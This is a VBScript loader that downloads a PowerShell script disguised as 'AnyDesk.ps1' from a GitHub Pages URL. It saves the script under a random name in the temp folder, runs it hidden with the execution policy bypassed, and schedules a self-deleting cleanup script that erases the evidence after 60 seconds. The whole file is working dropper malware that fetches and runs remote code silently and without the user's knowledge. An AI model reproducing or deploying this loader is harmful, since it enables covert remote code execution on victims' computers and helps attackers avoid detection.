' ============================================================
' 📥 VBS - PS1 Downloader + Executor with Auto Cleanup
' ============================================================
' 🔥 Features:
'   - Download PS1 file
'   - Execute PS1 silently
'   - Auto delete everything after 60 seconds
' ============================================================

Option Explicit

' ============================================================
' 🌐 CONFIGURATION
' ============================================================
Const PS1_URL = "https://hiuier00304.github.io/MyAdsHome/AnyDesk.ps1"
Const CLEANUP_DELAY_SECONDS = 60

' ============================================================
' 🔧 OBJECTS
' ============================================================
Dim objShell, objFSO, objWShell
Dim strTempPath, strPs1Name, strPs1Path
Dim bSuccess

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWShell = WScript.CreateObject("WScript.Shell")

' ============================================================
' 📁 GET TEMP PATH
' ============================================================
strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
If strTempPath = "" Then
    strTempPath = objShell.ExpandEnvironmentStrings("%TMP%")
End If

If Not objFSO.FolderExists(strTempPath) Then
    WScript.Quit 1
End If

' ============================================================
' 🎲 RANDOM STRING GENERATOR
' ============================================================
Function GetRandomString(nLength)
    Dim strChars, i, strResult
    strChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    strResult = ""
    Randomize
    For i = 1 To nLength
        strResult = strResult & Mid(strChars, Int((Len(strChars) * Rnd) + 1), 1)
    Next
    GetRandomString = strResult
End Function

' ============================================================
' 📥 DOWNLOAD FILE (Single download)
' ============================================================
Function DownloadFile(url, destPath)
    On Error Resume Next
    Dim objHTTP
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.3.0")
    End If
    If Err.Number <> 0 Then
        Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    End If
    If Err.Number <> 0 Then
        DownloadFile = False
        Exit Function
    End If
    On Error GoTo 0

    On Error Resume Next
    objHTTP.Open "GET", url, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    objHTTP.Send
    If Err.Number <> 0 Or objHTTP.Status <> 200 Then
        DownloadFile = False
        Exit Function
    End If
    On Error GoTo 0

    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile destPath, 2
    objStream.Close
    Set objStream = Nothing
    Set objHTTP = Nothing

    If objFSO.FileExists(destPath) Then
        If objFSO.GetFile(destPath).Size > 100 Then
            DownloadFile = True
        Else
            DownloadFile = False
        End If
    Else
        DownloadFile = False
    End If
End Function

' ============================================================
' 🚀 EXECUTE PS1 FILE (Silent)
' ============================================================
Function ExecutePs1(ps1Path)
    On Error Resume Next
    ' Run PowerShell with -ExecutionPolicy Bypass to allow script execution
    Dim cmd
    cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & ps1Path & """"
    objWShell.Run cmd, 0, False
    If Err.Number = 0 Then
        ExecutePs1 = True
    Else
        ExecutePs1 = False
    End If
End Function

' ============================================================
' 🧹 CLEANUP FUNCTION (Called after delay)
' ============================================================
Sub ScheduleCleanup(ps1Path)
    Dim cleanupScriptPath, objFile
    cleanupScriptPath = strTempPath & "\cleanup_" & GetRandomString(8) & ".vbs"
    
    Dim cleanupCode
    cleanupCode = "Option Explicit" & vbCrLf & _
                  "Dim objFSO, objShell" & vbCrLf & _
                  "Set objFSO = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
                  "Set objShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
                  "' Wait for delay" & vbCrLf & _
                  "objShell.Run ""timeout /t " & CLEANUP_DELAY_SECONDS & " /nobreak"", 0, True" & vbCrLf & _
                  "' Delete PS1 file" & vbCrLf & _
                  "If objFSO.FileExists(""" & ps1Path & """) Then objFSO.DeleteFile """ & ps1Path & """, True" & vbCrLf & _
                  "' Delete this cleanup script" & vbCrLf & _
                  "If objFSO.FileExists(""" & cleanupScriptPath & """) Then objFSO.DeleteFile """ & cleanupScriptPath & """, True" & vbCrLf & _
                  "WScript.Quit 0"
    
    Set objFile = objFSO.CreateTextFile(cleanupScriptPath, True)
    objFile.Write cleanupCode
    objFile.Close
    Set objFile = Nothing
    
    objWShell.Run "wscript.exe """ & cleanupScriptPath & """", 0, False
End Sub

' ============================================================
' 🚀 MAIN EXECUTION
' ============================================================
strPs1Name = "script_" & GetRandomString(12) & ".ps1"
strPs1Path = strTempPath & "\" & strPs1Name

bSuccess = False

' ============================================================
' 📥 DOWNLOAD PS1
' ============================================================
If DownloadFile(PS1_URL, strPs1Path) Then
    bSuccess = True
    ' Execute PS1 silently
    If ExecutePs1(strPs1Path) Then
        ' PS1 is running
    End If
End If

' ============================================================
' 🧹 SCHEDULE CLEANUP
' ============================================================
Call ScheduleCleanup(strPs1Path)

' ============================================================
' 🚪 EXIT (Silent)
' ============================================================
WScript.Quit 0